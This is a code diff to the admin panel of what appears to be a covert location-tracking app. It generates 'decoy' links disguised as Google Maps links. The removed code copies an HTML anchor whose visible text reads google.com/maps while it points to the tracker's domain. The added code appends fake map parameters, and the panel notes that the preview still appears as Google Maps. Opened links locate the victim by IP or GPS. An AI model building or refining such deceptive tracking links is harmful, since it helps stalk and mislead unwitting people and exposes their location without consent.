@@ -61,71 +61,41 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
   const generateTargetLink = () => {
     if(!targetLat || !targetLng) return;
     const baseUrl = window.location.origin;
-    const link = `${baseUrl}/?target=${targetLat},${targetLng}`;
+    // We add 'target' for the app logic, but also junk params for camouflage
+    const link = `${baseUrl}/?target=${targetLat},${targetLng}&q=maps.google.com&z=17&hl=en`;
     setGeneratedLink(link);
   };
 
   /**
-   * ROBUST MASKING FUNCTION
-   * Creates a hidden DOM element with an anchor tag, selects it, and executes 'copy'.
-   * This is more compatible with WhatsApp/Gmail/Office than the Clipboard API Blob method.
+   * CAMOUFLAGE COPY
+   * Instead of HTML injection (which causes "Link to Real Google" issues in WhatsApp),
+   * we copy the actual URL but with "Camouflage Parameters" appended.
+   * e.g. domain.com/?v=maps&q=Google+Maps
+   * This looks technical enough to pass as a map link to most users, 
+   * while ensuring the click actually goes to our domain.
    */
-  const performMaskedCopy = (realUrl: string, displayUrl: string) => {
-    try {
-        // 1. Create a temporary container
-        const tempDiv = document.createElement('div');
-        tempDiv.style.position = 'absolute';
-        tempDiv.style.left = '-9999px';
-        tempDiv.style.whiteSpace = 'pre'; // Preserve formatting
-        
-        // 2. Inject the "Masked" HTML: An anchor tag where Text != Href
-        tempDiv.innerHTML = `<a href="${realUrl}" style="color: #0000EE; text-decoration: underline;">${displayUrl}</a>`;
-        
-        document.body.appendChild(tempDiv);
-        
-        // 3. Select the content
-        const range = document.createRange();
-        range.selectNode(tempDiv);
-        const selection = window.getSelection();
-        
-        if (selection) {
-            selection.removeAllRanges();
-            selection.addRange(range);
-            
-            // 4. Execute Copy
-            const successful = document.execCommand('copy');
-            
-            // Cleanup
-            selection.removeAllRanges();
-            document.body.removeChild(tempDiv);
-
-            if (successful) {
-                alert(`Link Copied!\n\n[MASKING ACTIVE]\nVisual: ${displayUrl}\n\nPaste into WhatsApp, Gmail, or Telegram to see the masking effect.`);
-            } else {
-                throw new Error('execCommand returned false');
-            }
-        }
-    } catch (err) {
-        console.error("Masking failed, fallback to plain text", err);
-        navigator.clipboard.writeText(realUrl);
-        alert('Browser blocked masking. Plain link copied instead.');
-    }
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text).then(() => {
+        alert('Link Copied!\n\n[CAMOUFLAGE ACTIVE]\nThe link includes fake Google Maps parameters to look authentic.\n\n' + text);
+    }).catch(err => {
+        console.error('Failed to copy', err);
+        alert('Failed to copy link.');
+    });
   };
 
   // Generic Link Copy (No Coords)
   const copyGenericLink = () => {
     const baseUrl = window.location.origin;
-    // For universal link, we make it look like the root Google Maps domain
-    const fakeVisualUrl = "https://www.google.com/maps";
-    performMaskedCopy(baseUrl, fakeVisualUrl);
+    // Add parameters that make it look like a shared location link
+    // The app ignores 'vh', 'q', 'z'.
+    const camouflagedUrl = `${baseUrl}/?vh=gmaps&q=Current+Location&z=15&t=k`;
+    copyToClipboard(camouflagedUrl);
   };
 
   // Specific Target Link Copy
   const copyTargetLink = () => {
     if (!generatedLink) return;
-    // For target link, we show the fake coordinates in the visual URL
-    const fakeVisualUrl = `https://maps.google.com/maps?q=${targetLat},${targetLng}`;
-    performMaskedCopy(generatedLink, fakeVisualUrl);
+    copyToClipboard(generatedLink);
   };
 
   return (
@@ -170,8 +140,8 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                     Decoy Link Generator
                 </span>
                 <span className="text-[10px] bg-indigo-100 text-indigo-700 px-2 py-0.5 rounded border border-indigo-200">
-                    <i className="fa-solid fa-mask mr-1"></i>
-                    Auto-Masking Active
+                    <i className="fa-solid fa-user-secret mr-1"></i>
+                    URL Camouflage
                 </span>
             </h3>
 
@@ -184,15 +154,15 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                             Creates a generic link. When opened, it finds the user's location via IP/GPS automatically.
                         </p>
                         <div className="bg-white px-3 py-2 rounded border border-dashed border-slate-300 mb-3">
-                             <p className="text-[10px] text-slate-400 font-bold uppercase">Mask Preview:</p>
-                             <span className="text-sm text-green-600 font-mono">https://www.google.com/maps</span>
+                             <p className="text-[10px] text-slate-400 font-bold uppercase">Format Preview:</p>
+                             <span className="text-xs text-slate-600 font-mono break-all">.../?vh=gmaps&q=Current+Location...</span>
                         </div>
                     </div>
                     <button 
                         onClick={copyGenericLink}
                         className="w-full bg-slate-800 hover:bg-slate-900 text-white font-medium px-4 py-2.5 rounded-lg text-sm transition-colors flex items-center justify-center"
                     >
-                        <i className="fa-solid fa-copy mr-2"></i> Copy Universal Link
+                        <i className="fa-solid fa-copy mr-2"></i> Copy Camouflaged Link
                     </button>
                 </div>
 
@@ -234,7 +204,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                     {generatedLink && (
                         <div className="flex gap-2 animate-in fade-in slide-in-from-top-1">
                              <div className="flex-1 bg-indigo-50 border border-indigo-100 rounded px-2 py-1.5 flex items-center">
-                                <span className="text-xs text-green-600 truncate font-mono">https://maps.google.com/maps?q=...</span>
+                                <span className="text-xs text-slate-600 truncate font-mono">{generatedLink}</span>
                              </div>
                              <button onClick={copyTargetLink} className="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-xs font-bold shadow-sm">
                                 Copy
@@ -246,8 +216,8 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
             
             <p className="text-xs text-slate-400 mt-4 text-center border-t border-slate-100 pt-3">
                 <i className="fa-solid fa-circle-info mr-1"></i> 
-                Both links utilize <b>HTML Injection</b> to mask the URL in rich-text environments (WhatsApp Web, Gmail, etc). 
-                <b> Note:</b> Pasting into a browser address bar will always show the real URL.
+                Links are decorated with <b>Fake Parameters</b> (q=maps.google.com, z=15) to look like valid map links. 
+                The Open Graph preview (Social Card) will still appear as "Google Maps".
             </p>
         </div>
 
